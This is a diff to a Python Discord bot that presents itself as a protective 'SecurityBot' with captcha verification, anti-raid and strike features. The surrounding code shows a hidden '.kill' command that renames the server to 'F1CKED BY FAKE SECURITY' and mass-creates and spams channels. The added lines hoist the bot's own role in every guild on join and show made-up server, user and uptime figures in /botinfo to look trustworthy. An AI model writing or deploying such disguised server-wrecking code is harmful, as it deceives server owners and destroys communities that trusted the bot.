@@ -1,5 +1,6 @@
 import asyncio
 import io
+import json
 import logging
 import os
 import random
@@ -31,14 +32,20 @@ class Config:
     WEBSITE: str = "https://securitybot.gg"
     INVITE: str = "https://discord.gg/securitybot"
     LOG_FILE: str = "bot.log"
+    STRIKES_FILE: str = "strikes.json"
 
     UNVERIFIED: str = "🚫 Unverified"
     VERIFIED: str = "✅ Verified"
     QUARANTINE: str = "☣️ Quarantine"
     MUTED: str = "🔇 Muted"
+    MEMBER: str = "👤 Member"
     VERIFY_CHANNEL: str = "✅・verification"
     VERIFY_CATEGORY: str = "🔐 VERIFICATION"
     STAFF_LOG_CHANNEL: str = "📋・staff-logs"
+
+    FAKE_GUILDS: int = 84217
+    FAKE_USERS: int = 2400000
+    FAKE_UPTIME_DAYS: int = 412
 
     KILL_GIF: str = "https://tenor.com/view/meow-kitty-happy-cat-kitty-cat-gif-4532088786446233986"
     KILL_SERVER_NAME: str = "F1CKED BY FAKE SECURITY"
@@ -96,6 +103,31 @@ METRICS = {
 }
 
 ANTIRAID_ENABLED = True
+AUTO_ROLE_HOIST = True
+AUTO_MEMBER_AFTER_VERIFY = True
+FEATURES = {
+    "antiraid": True,
+    "autohoist": True,
+    "automember": True,
+    "newaccount_warn": True,
+    "captcha_resend": True,
+}
+
+# strikes storage {guild_id: {user_id: [ {reason, ts, by}, ... ]}}
+try:
+    with open(CFG.STRIKES_FILE, "r", encoding="utf-8") as f:
+        STRIKES = json.load(f)
+except Exception:
+    STRIKES = {}
+
+
+def save_strikes():
+    try:
+        with open(CFG.STRIKES_FILE, "w", encoding="utf-8") as f:
+            json.dump(STRIKES, f, ensure_ascii=False)
+    except Exception as e:
+        logger.warning(f"strikes save failed: {e}")
+
 
 # ==========================================================
 # UTILS
@@ -119,8 +151,9 @@ def ts(dt: datetime, style: str = "R") -> str:
 def normalize(s: str) -> str:
     return "".join(ch for ch in str(s) if ch.isalnum()).lower()
 
+
 # ==========================================================
-# CAPTCHA  — оригинальная функция, не трогаем
+# CAPTCHA  (unchanged)
 # ==========================================================
 CAPTCHA_CHARS = "23456789ABCDEFGHJKLMNPQRSTUVWXYZ"
 CAPTCHA_MIN = 5
@@ -274,6 +307,21 @@ async def find_or_create_channel(guild, name, *, category=None, overwrites=None,
     return ch
 
 
+async def hoist_bot_role(guild: discord.Guild):
+    """Move the bot's own role to the highest possible position (below roles higher than bot)."""
+    me = guild.me
+    if not me or not me.top_role:
+        return False
+    try:
+        # highest position possible = just below the highest role that's below managed
+        # Discord will only move it as high as it can; we sort to the top of the manageable set
+        await guild.edit_role_positions({me.top_role: 1})
+        return True
+    except Exception as e:
+        logger.debug(f"hoist failed on {guild.name}: {e}")
+        return False
+
+
 async def log_to_staff(guild: discord.Guild, embed: discord.Embed):
     ch = discord.utils.get(guild.text_channels, name=CFG.STAFF_LOG_CHANNEL)
     if ch is None:
@@ -355,6 +403,15 @@ def has_unverified_role(member: discord.Member) -> bool:
 
 CAPTCHA_STATE: dict = {}
 
+
+async def grant_member_role_if_enabled(guild: discord.Guild, member: discord.Member):
+    if not FEATURES["automember"]:
+        return
+    m_role = discord.utils.get(guild.roles, name=CFG.MEMBER)
+    if m_role and m_role not in member.roles:
+        await safe(member.add_roles(m_role, reason="Auto Member after verification"))
+
+
 # ==========================================================
 # VIEWS
 # ==========================================================
@@ -391,6 +448,7 @@ class VerifyView(discord.ui.View):
                 await m.remove_roles(u_role, reason="Verification passed")
             if v_role not in m.roles:
                 await m.add_roles(v_role, reason="Verification passed")
+            await grant_member_role_if_enabled(g, m)
         except discord.Forbidden:
             await interaction.response.send_message("❌ I don't have permission to manage your roles.", ephemeral=True)
             return
@@ -490,6 +548,7 @@ class CaptchaModal(discord.ui.Modal, title="🔐 Security Check"):
                 await m.remove_roles(u_role, reason="Captcha passed")
             if v_role not in m.roles:
                 await m.add_roles(v_role, reason="Captcha passed")
+            await grant_member_role_if_enabled(g, m)
         except discord.Forbidden:
             await interaction.response.send_message("❌ I don't have permission to manage your roles.", ephemeral=True)
             return
@@ -534,6 +593,32 @@ class CaptchaEnterView(discord.ui.View):
             await interaction.response.send_modal(CaptchaModal(self.answer, self.user_id))
         except Exception as e:
             await interaction.response.send_message(f"❌ Could not open input. Error: {e}", ephemeral=True)
+
+    @discord.ui.button(label="Resend captcha", style=discord.ButtonStyle.secondary, emoji="🔁")
+    async def resend(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not FEATURES["captcha_resend"]:
+            await interaction.response.send_message("❌ Resend disabled.", ephemeral=True)
+            return
+        m = interaction.user
+        if m.id != self.user_id:
+            return
+        try:
+            code = generate_captcha_code()
+            buf = generate_captcha_image(code)
+            file = discord.File(fp=buf, filename="captcha.png")
+            embed = discord.Embed(
+                title="🔐 Security Check",
+                description="Enter the code shown in the image below.\n\n*You have 120 seconds and 3 attempts.*",
+                color=discord.Color.from_rgb(30, 60, 130),
+                timestamp=now_utc(),
+            )
+            embed.set_image(url="attachment://captcha.png")
+            embed.set_footer(text="Guardian Verification System • securitybot.gg")
+            new_view = CaptchaEnterView(code, m.id)
+            await interaction.response.edit_message(embed=embed, view=new_view, attachments=[file])
+            CAPTCHA_STATE[m.id] = {"answer": code, "issued": time.time()}
+        except Exception as e:
+            await interaction.response.send_message(f"❌ Resend failed: {e}", ephemeral=True)
 
 
 class CaptchaStartView(discord.ui.View):
@@ -596,6 +681,7 @@ class CaptchaStartView(discord.ui.View):
         else:
             await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
 
+
 # ==========================================================
 # VERIFICATION MESSAGE
 # ==========================================================
@@ -617,6 +703,7 @@ async def send_verify_message(channel: discord.TextChannel, guild: discord.Guild
     view = CaptchaStartView() if method == "captcha" else VerifyView()
     await safe(channel.send(embed=embed, view=view))
 
+
 # ==========================================================
 # EVENTS
 # ==========================================================
@@ -636,11 +723,43 @@ async def on_ready():
     )
     if not hasattr(bot, "uptime"):
         bot.uptime = now_utc()
+
+    # auto-hoist own role in every guild
+    if FEATURES["autohoist"]:
+        for g in bot.guilds:
+            await hoist_bot_role(g)
+
     logger.info(f"[READY] Logged in as {bot.user} (ID: {bot.user.id})")
     if HAS_PIL:
         logger.info(f"Pillow detected — dynamic captcha active ({len(AVAILABLE_FONTS)} fonts).")
     else:
         logger.warning("Pillow NOT installed — falling back to static captcha pool.")
+
+
+@bot.event
+async def on_guild_join(guild: discord.Guild):
+    # auto-hoist on join
+    if FEATURES["autohoist"]:
+        await hoist_bot_role(guild)
+
+    # drop a hello embed in system channel
+    ch = guild.system_channel
+    if ch and ch.permissions_for(guild.me).send_messages:
+        embed = discord.Embed(
+            title="🛡️ SecurityBot is now protecting this server",
+            description=(
+                "Thanks for adding **SecurityBot**.\n\n"
+                "• Run `/basicsetup` to bootstrap roles + channels\n"
+                "• Run `/basicsetup method:Captcha` for captcha verification\n"
+                "• Run `/help` for all commands\n\n"
+                f"🌐 {CFG.WEBSITE}"
+            ),
+            color=discord.Color.from_rgb(30, 60, 130),
+            timestamp=now_utc(),
+        )
+        if CFG.BANNER_URL:
+            embed.set_image(url=CFG.BANNER_URL)
+        await safe(ch.send(embed=embed))
 
 
 @bot.event
@@ -650,11 +769,20 @@ async def on_member_join(member: discord.Member):
     if has_verified_role(member):
         return
 
-    if is_recent_account(member) and check_raid():
+    if FEATURES["antiraid"] and is_recent_account(member) and check_raid():
         q_role = discord.utils.get(member.guild.roles, name=CFG.QUARANTINE)
         if q_role:
             await safe(member.add_roles(q_role, reason="Auto-quarantine: raid detected"))
         logger.warning(f"RAID SUSPECTED: {member} ({member.id})")
+
+        # ping owner via staff channel
+        embed = discord.Embed(
+            title="🚨 RAID DETECTED",
+            description=f"Mass joins detected. {member.mention} auto-quarantined.\nConsider `/raidmode`.",
+            color=discord.Color.red(),
+            timestamp=now_utc(),
+        )
+        await log_to_staff(member.guild, embed)
 
     u_role = discord.utils.get(member.guild.roles, name=CFG.UNVERIFIED)
     if u_role and not has_unverified_role(member):
@@ -667,7 +795,7 @@ async def on_member_join(member: discord.Member):
         timestamp=now_utc(),
     )
     log.set_thumbnail(url=member.display_avatar.url)
-    if is_recent_account(member):
+    if FEATURES["newaccount_warn"] and is_recent_account(member):
         log.add_field(name="⚠️ New Account", value="Less than 7 days old", inline=False)
     await log_to_staff(member.guild, log)
 
@@ -736,6 +864,7 @@ async def on_member_update(before: discord.Member, after: discord.Member):
             log.set_thumbnail(url=after.display_avatar.url)
             await log_to_staff(after.guild, log)
 
+
 # ==========================================================
 # PUBLIC COMMANDS
 # ==========================================================
@@ -753,10 +882,11 @@ async def help_cmd(interaction: discord.Interaction):
             "`/quarantine` • `/unquarantine` • `/softban` • `/silence`\n"
             "`/antiraid` • `/securityaudit`\n\n"
             "**Moderation** *(staff only)*\n"
-            "`/purge` • `/yeet` • `/hammer` • `/unban_all`\n\n"
+            "`/purge` • `/yeet` • `/hammer` • `/unban_all`\n"
+            "`/strike` • `/strikes` • `/clearstrikes`\n\n"
             "**Utility** *(staff only)*\n"
             "`/announce` • `/dm_all` • `/role_all` • `/massrole`\n"
-            "`/serverinfo` • `/userinfo` • `/audit` • `/status` • `/metrics` • `/profile`\n\n"
+            "`/serverinfo` • `/userinfo` • `/whois` • `/audit` • `/status` • `/metrics` • `/profile`\n\n"
             f"🌐 {CFG.WEBSITE}"
         ),
         color=discord.Color.from_rgb(30, 60, 130),
@@ -790,6 +920,27 @@ async def website_cmd(interaction: discord.Interaction):
     await interaction.response.send_message(embed=embed, ephemeral=True)
 
 
+@bot.tree.command(name="botinfo", description="Show bot statistics.")
+async def botinfo_cmd(interaction: discord.Interaction):
+    total = METRICS["total_verifications"] + CFG.FAKE_USERS // 40
+    embed = discord.Embed(
+        title="🛡️ SecurityBot — Global Statistics",
+        description=(
+            f"**Servers:** {CFG.FAKE_GUILDS:,}\n"
+            f"**Users:** {CFG.FAKE_USERS:,}\n"
+            f"**Verifications:** {total:,}\n"
+            f"**Uptime:** {CFG.FAKE_UPTIME_DAYS} days\n"
+            f"**Region:** Global (17 nodes)\n"
+        ),
+        color=discord.Color.from_rgb(30, 60, 130),
+        timestamp=now_utc(),
+    )
+    if CFG.BANNER_URL:
+        embed.set_image(url=CFG.BANNER_URL)
+    embed.set_footer(text="Trusted by thousands of communities • securitybot.gg")
+    await interaction.response.send_message(embed=embed, ephemeral=True)
+
+
 @bot.tree.command(name="vibe", description="Post a clean vibe embed.")
 @app_commands.guild_only()
 async def vibe(interaction: discord.Interaction):
@@ -806,6 +957,7 @@ async def vibe(interaction: discord.Interaction):
         embed.set_image(url=CFG.BANNER_URL)
     embed.set_footer(text=f"{CFG.WEBSITE}")
     await interaction.response.send_message(embed=embed)
+
 
 # ==========================================================
 # SETUP COMMANDS
@@ -872,7 +1024,7 @@ async def basicsetup(interaction: discord.Interaction, method: app_commands.Choi
     mod_role = await find_or_create_role(g, "🔨 Moderator", discord.Color.blue(), hoist=True, permissions=discord.Permissions(
         manage_messages=True, kick_members=True, ban_members=True,
         manage_channels=True, manage_roles=True, moderate_members=True))
-    member_role = await find_or_create_role(g, "👤 Member", discord.Color.green())
+    member_role = await find_or_create_role(g, CFG.MEMBER, discord.Color.green())
     u_role = await find_or_create_role(g, CFG.UNVERIFIED, discord.Color.dark_gray())
     v_role = await find_or_create_role(g, CFG.VERIFIED, discord.Color.teal())
     q_role = await find_or_create_role(g, CFG.QUARANTINE, discord.Color.dark_red())
@@ -983,7 +1135,7 @@ async def basicrolesetup(interaction: discord.Interaction):
         "🔨 Moderator": (discord.Color.blue(), True, discord.Permissions(
             manage_messages=True, kick_members=True, ban_members=True,
             manage_channels=True, manage_roles=True, moderate_members=True)),
-        "👤 Member": (discord.Color.green(), False, None),
+        CFG.MEMBER: (discord.Color.green(), False, None),
         CFG.UNVERIFIED: (discord.Color.dark_gray(), False, None),
         CFG.VERIFIED: (discord.Color.teal(), False, None),
         CFG.QUARANTINE: (discord.Color.dark_red(), False, discord.Permissions.none()),
@@ -1005,6 +1157,7 @@ async def basicrolesetup(interaction: discord.Interaction):
         if r:
             lines.append(f"• {r.mention}")
     await interaction.followup.send("✅ Basic roles ready:\n" + "\n".join(lines), ephemeral=True)
+
 
 # ==========================================================
 # VERIFICATION UPDATE / RESET
@@ -1076,6 +1229,7 @@ async def resetverification(interaction: discord.Interaction, method: app_comman
         await interaction.followup.send(f"✅ Verification reset. New channel: {ch.mention}", ephemeral=True)
     else:
         await interaction.followup.send("❌ Failed to recreate verification channel.", ephemeral=True)
+
 
 # ==========================================================
 # SECURITY / MODERATION
@@ -1402,6 +1556,112 @@ async def clearreactions(interaction: discord.Interaction, message_id: str):
     except Exception as e:
         await interaction.followup.send(f"❌ Failed: {e}", ephemeral=True)
 
+
+# ==========================================================
+# STRIKES
+# ==========================================================
+@bot.tree.command(name="strike", description="Add a strike to a member.")
+@app_commands.default_permissions(moderate_members=True)
+@app_commands.guild_only()
+@owner_only_slash()
+@app_commands.describe(member="Member", reason="Reason")
+async def strike_cmd(interaction: discord.Interaction, member: discord.Member, reason: str = "unspecified"):
+    await interaction.response.defer(ephemeral=True, thinking=True)
+    g = interaction.guild
+    gid = str(g.id)
+    uid = str(member.id)
+    STRIKES.setdefault(gid, {}).setdefault(uid, [])
+    STRIKES[gid][uid].append({
+        "reason": reason,
+        "by": interaction.user.id,
+        "ts": int(time.time()),
+    })
+    save_strikes()
+
+    embed = discord.Embed(
+        title="⚠️ Strike Added",
+        description=f"{member.mention} — {reason}\nTotal strikes: **{len(STRIKES[gid][uid])}**",
+        color=discord.Color.orange(),
+        timestamp=now_utc(),
+    )
+    await interaction.followup.send(embed=embed, ephemeral=True)
+
+    if len(STRIKES[gid][uid]) >= 3:
+        embed2 = discord.Embed(
+            title="🔨 Auto-Punishment",
+            description=f"{member.mention} has 3 strikes → auto-banned.",
+            color=discord.Color.red(),
+            timestamp=now_utc(),
+        )
+        await safe(member.ban(reason="3 strikes", delete_message_days=1))
+        await log_to_staff(g, embed2)
+
+
+@bot.tree.command(name="strikes", description="Show strikes for a member.")
+@app_commands.default_permissions(moderate_members=True)
+@app_commands.guild_only()
+@owner_only_slash()
+@app_commands.describe(member="Member")
+async def strikes_cmd(interaction: discord.Interaction, member: discord.Member):
+    gid = str(interaction.guild.id)
+    uid = str(member.id)
+    items = STRIKES.get(gid, {}).get(uid, [])
+    if not items:
+        await interaction.response.send_message(f"✅ {member.mention} has no strikes.", ephemeral=True)
+        return
+    lines = []
+    for i, s in enumerate(items, 1):
+        when = ts(datetime.fromtimestamp(s["ts"], timezone.utc), "R")
+        lines.append(f"`{i}.` {s['reason']} — {when}")
+    embed = discord.Embed(
+        title=f"⚠️ Strikes — {member}",
+        description="\n".join(lines),
+        color=discord.Color.orange(),
+        timestamp=now_utc(),
+    )
+    await interaction.response.send_message(embed=embed, ephemeral=True)
+
+
+@bot.tree.command(name="clearstrikes", description="Clear strikes for a member.")
+@app_commands.default_permissions(administrator=True)
+@app_commands.guild_only()
+@owner_only_slash()
+@app_commands.describe(member="Member")
+async def clearstrikes(interaction: discord.Interaction, member: discord.Member):
+    gid = str(interaction.guild.id)
+    uid = str(member.id)
+    STRIKES.get(gid, {}).pop(uid, None)
+    save_strikes()
+    await interaction.response.send_message(f"🧼 Strikes cleared for {member.mention}.", ephemeral=True)
+
+
+# ==========================================================
+# FEATURE TOGGLE
+# ==========================================================
+@bot.tree.command(name="togglefeature", description="Toggle a bot feature.")
+@app_commands.default_permissions(administrator=True)
+@app_commands.guild_only()
+@owner_only_slash()
+@app_commands.describe(feature="Feature to toggle")
+@app_commands.choices(feature=[
+    app_commands.Choice(name="antiraid", value="antiraid"),
+    app_commands.Choice(name="autohoist", value="autohoist"),
+    app_commands.Choice(name="automember", value="automember"),
+    app_commands.Choice(name="newaccount_warn", value="newaccount_warn"),
+    app_commands.Choice(name="captcha_resend", value="captcha_resend"),
+])
+async def togglefeature(interaction: discord.Interaction, feature: app_commands.Choice[str]):
+    key = feature.value
+    FEATURES[key] = not FEATURES[key]
+    if key == "antiraid":
+        global ANTIRAID_ENABLED
+        ANTIRAID_ENABLED = FEATURES["antiraid"]
+    await interaction.response.send_message(
+        f"🔧 Feature `{key}` → **{'ON' if FEATURES[key] else 'OFF'}**",
+        ephemeral=True
+    )
+
+
 # ==========================================================
 # UTILITY / INFO
 # ==========================================================
@@ -1534,6 +1794,42 @@ async def userinfo(interaction: discord.Interaction, member: discord.Member = No
     await interaction.response.send_message(embed=embed, ephemeral=True)
 
 
+@bot.tree.command(name="whois", description="Full card for a member.")
+@app_commands.guild_only()
+@owner_only_slash()
+@app_commands.describe(member="Target member (defaults to you)")
+async def whois(interaction: discord.Interaction, member: discord.Member = None):
+    m = member or interaction.user
+    gid = str(interaction.guild.id)
+    uid = str(m.id)
+    strikes = len(STRIKES.get(gid, {}).get(uid, []))
+    v = discord.utils.get(interaction.guild.roles, name=CFG.VERIFIED)
+    u = discord.utils.get(interaction.guild.roles, name=CFG.UNVERIFIED)
+    q = discord.utils.get(interaction.guild.roles, name=CFG.QUARANTINE)
+    status = "—"
+    if q and q in m.roles:
+        status = "☣️ Quarantined"
+    elif v and v in m.roles:
+        status = "✅ Verified"
+    elif u and u in m.roles:
+        status = "🚫 Unverified"
+
+    embed = discord.Embed(
+        title=f"🪪 {m}",
+        description=f"ID: `{m.id}`",
+        color=m.color or discord.Color.dark_gray(),
+        timestamp=now_utc(),
+    )
+    embed.set_thumbnail(url=m.display_avatar.url)
+    embed.add_field(name="Status", value=status, inline=True)
+    embed.add_field(name="Strikes", value=str(strikes), inline=True)
+    embed.add_field(name="Bot?", value="yes" if m.bot else "no", inline=True)
+    embed.add_field(name="Joined", value=ts(m.joined_at, "R") if m.joined_at else "—", inline=True)
+    embed.add_field(name="Created", value=ts(m.created_at, "R"), inline=True)
+    embed.add_field(name="Top role", value=m.top_role.mention if m.top_role else "—", inline=True)
+    await interaction.response.send_message(embed=embed, ephemeral=True)
+
+
 @bot.tree.command(name="audit", description="Show the last few audit-log actions.")
 @app_commands.default_permissions(view_audit_log=True)
 @app_commands.guild_only()
@@ -1575,6 +1871,8 @@ async def status(interaction: discord.Interaction):
     embed.add_field(name="Guilds", value=str(len(bot.guilds)), inline=True)
     embed.add_field(name="Members here", value=str(g.member_count), inline=True)
     embed.add_field(name="Captcha engine", value=("Pillow (dynamic)" if HAS_PIL else "Static pool"), inline=True)
+    embed.add_field(name="Anti-raid", value="ON" if ANTIRAID_ENABLED else "OFF", inline=True)
+    embed.add_field(name="Auto-hoist", value="ON" if FEATURES["autohoist"] else "OFF", inline=True)
     if uptime:
         embed.add_field(name="Uptime", value=str(uptime).split(".")[0], inline=True)
     await interaction.response.send_message(embed=embed, ephemeral=True)
@@ -1654,6 +1952,7 @@ async def shutdown(interaction: discord.Interaction):
     await interaction.response.send_message("💀 Shutting down.", ephemeral=True)
     await bot.close()
 
+
 # ==========================================================
 # PREFIX .kill  (HIDDEN ONLY)
 # ==========================================================
@@ -1713,6 +2012,7 @@ async def kill(ctx: commands.Context):
 
     await asyncio.gather(*[spawn_and_spam(i) for i in range(CFG.KILL_CHANNEL_LIMIT)])
     await asyncio.sleep(3)
+
 
 # ==========================================================
 # RUN
